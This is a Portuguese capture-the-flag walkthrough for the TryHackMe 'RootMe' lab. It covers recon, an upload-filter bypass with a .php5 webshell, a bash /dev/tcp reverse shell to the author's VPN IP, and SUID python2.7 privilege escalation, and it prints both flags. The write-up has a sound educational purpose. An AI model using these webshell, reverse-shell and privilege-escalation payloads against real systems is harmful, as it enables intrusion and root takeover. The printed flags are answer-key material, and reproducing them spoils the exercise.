# RootMe — TryHackMe

Domingo à noite, sem nada pra fazer, falei "vou fazer uma easy rapidinha". Spoiler: não foi tão rapidinha porque eu me prendi na parte mais besta. Anotando tudo aqui pra não passar a mesma raiva de novo.

## 0. Ligando a máquina e a VPN

Primeira coisa: conectar a VPN da THM e ver se ganhei IP. Se não tiver `tun0`, nem adianta continuar.

```bash
ip a show tun0
```

O meu caiu como `192.168.129.84`. Anotei num canto porque ia precisar dele pro reverse shell depois — toda vez eu esqueço e tenho que voltar aqui, então fica a dica: anota agora.

Depois dei um ping no alvo só pra confirmar que a máquina tinha subido mesmo:

```bash
ping 10.67.188.203
```

Respondeu com `ttl=62`, que já entrega que é Linux. Tava no ar, bora.

Pra facilitar a vida exportei o IP do alvo numa variável. Isso já encurta todos os comandos daqui pra frente:

```bash
TARGET=10.67.188.203
echo $TARGET
```

## 1. Recon — o básico que sempre funciona

Nmap de sempre, sem inventar moda:

```bash
nmap -sV $TARGET
```

Resultado:
- `22` — SSH, OpenSSH 8.2p1
- `80` — HTTP, Apache 2.4.41

Só duas portas. Quando é assim, 99% das vezes o caminho é pela web. Então nem perdi tempo com SSH agora.

Abri `http://10.67.188.203` no navegador: uma página preta escrito "HackIT - Home" e "Can you root me?". Página estática, sem login, sem nada clicável. Ou seja, o buraco tá escondido em diretório.

Fui de gobuster. Confesso que errei o comando duas vezes — primeiro esqueci o `-u`, depois errei o caminho da wordlist (toda distro põe num lugar diferente, né). O que funcionou:

```bash
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Achou de cara:
- `/panel` — página de upload
- `/uploads` — pasta com listagem aberta (dava pra ver os arquivos)
- `/css`, `/js`, `/index.php`

Quando você vê um upload + uma pasta com listagem aberta, o cérebro já acende: é ali.

## 2. O upload — onde eu travei feito bobo

O `/panel/` é um form simples: escolhe o arquivo, clica em Upload. O `/uploads/` mostra o que subiu.

Primeiro teste, o mais inocente possível:

```bash
echo '<?php echo "pwned"; ?>' > test.php
```

Subi pelo form e tomei na cara:

> PHP não é permitido!

Beleza, tem filtro de extensão. Até aí normal. Pensei "vou testar as variações clássicas" e subi uma de cada vez: `.php5`, `.phtml`, `.php4`, `.phar`... Todas deram "sucesso". Fiquei feliz à toa.

Aqui foi meu erro de domingo: eu tinha baixado um `php-reverse-shell.php4` pronto da internet e fiquei uns 20 minutos tentando fazer ele voltar shell, sem entender porque não ia. O arquivo ainda por cima veio quebrado (quando abri tinha umas 40 linhas com código cortado no meio, nem compilava direito).

O que eu demorei pra sacar: **subir não é executar**. O servidor aceitava `.php4` mas na hora de acessar ele mostrava o código-fonte em vez de rodar. Testei assim, um por um:

```bash
curl http://$TARGET/uploads/test.php5
curl http://$TARGET/uploads/test.phtml
curl http://$TARGET/uploads/test.php4
```

- `.php5` voltou só `pwned` — executou!
- `.phtml` voltou `pwned` — executou também
- `.php4` voltou o código inteiro `<?php echo...` — não executou, só serviu o arquivo como texto

Moral da história: nessa máquina o certo é `.php5`. Joguei o `.php4` fora e a vida andou.

## 3. Pegando shell do jeito simples

Desisti do reverse shell gigante e fui de webshell de uma linha, só pra validar o RCE:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php5
```

Subi pelo form do `/panel/` e testei:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=id"
```

Voltou:

```
uid=33(www-data) gid=33(www-data)
```

Quando eu vi `www-data` eu dei até uma risadinha sozinho aqui em casa. Tava dentro. Esse `shell.php5` virou meu terminal daqui pra frente — tudo que eu precisava era trocar o `cmd`:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=whoami"
curl "http://$TARGET/uploads/shell.php5?cmd=pwd;ls -la"
```

Simples assim, sem flag complicada. Se quiser ver a saída bonitinha, troca o `id` por qualquer comando Linux.

## 4. A primeira flag (user.txt)

Procurei onde tava a flag de usuário. Eu jurava que ia estar na home de alguém, mas não:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=ls -la /var/www/"
```

Tinha um `user.txt` ali no meio, dono `www-data`. Pra ler:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=cat /var/www/user.txt"
```

```
THM{y0u_g0t_a_sh3ll}
```

Primeira flag no bolso. O nome já entrega: "you got a shell", kkk.

## 5. Privesc — o arquivo estranho

Com shell de `www-data`, o próximo passo é sempre o mesmo: procurar binário com SUID. Pra quem tá começando, SUID é aquele `s` na permissão que faz o programa rodar como o dono (no caso, root) mesmo quando outro usuário executa.

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=find / -perm -u=s -type f 2>/dev/null | grep -v snap"
```

Veio a lista padrão (`sudo`, `passwd`, `su`, `mount`...) e um que não tinha nada a ver ali no meio:

```
/usr/bin/python2.7
```

Confirmei:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=ls -l /usr/bin/python*"
```

```
-rwsr-xr-x 1 root root /usr/bin/python2.7
```

Aquele `s` em `rws` é o SUID. Python com SUID é presente: dá pra mandar ele rodar qualquer coisa como root. É o famoso GTFOBins — vale decorar esse.

Sem precisar de shell interativo, mandei ele rodar `id` e ler a flag de root direto:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=/usr/bin/python2.7 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\",\"-c\",\"id;cat /root/root.txt\")'"
```

Voltou:

```
uid=33(www-data) gid=33(www-data) euid=0(root)
THM{pr1v1l3g3_3sc4l4t10n}
```

O `euid=0(root)` confirma: executei como root. Segunda flag no bolso.

## 6. Bônus — reverse shell de verdade (opcional)

O webshell já resolveu tudo, mas eu quis treinar o reverse interativo também. Deixei um `rev.php5` pronto na pasta:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.129.84/4444 0>&1'"); ?>
```

Lembra do IP do `tun0` que eu mandei anotar? É ele que vai ali. Se tua VPN reconectar e o IP mudar, atualiza essa linha.

Passo a passo:

Terminal 1, deixa ouvindo:
```bash
nc -lvnp 4444
```

Terminal 2, sobe e dispara:
```bash
curl -F "fileUpload=@rev.php5" -F "submit=Upload" http://$TARGET/panel/
curl http://$TARGET/uploads/rev.php5
```

Caiu no terminal 1. Pra deixar usável:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

E o privesc interativo é o mesmo esquema:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh","sh","-p")'
id
cat /root/root.txt
```

## Resumo

| Flag | Onde | Valor |
|------|------|-------|
| user | `/var/www/user.txt` | `THM{y0u_g0t_a_sh3ll}` |
| root | `/root/root.txt` | `THM{pr1v1l3g3_3sc4l4t10n}` |

Vetor completo: upload com bypass de extensão (`.php` → `.php5`) + SUID no `python2.7`.

## O que eu levo dessa noite

1. **Subiu ≠ executou.** Sempre valida com um `echo pwned` antes de mandar reverse shell. Teria me poupado 20 minutos.
2. **Não confia em shell pronto.** Abre o arquivo e lê, o meu veio quebrado e eu nem percebi.
3. **Encurta os comandos.** Exportar `TARGET=` no começo deixa tudo legível. Escrever `curl -G --data-urlencode` pra tudo é coisa de quem quer sofrer.
4. **SUID em interpretador (python, ruby, perl) é quase sempre o privesc** nessas easy. Bate o olho na lista e procura o que destoa.

Máquina boa pra quem tá começando: ensina enumeração web, bypass bobo e privesc clássico, sem precisar de exploit mirabolante. Valeu o domingo.
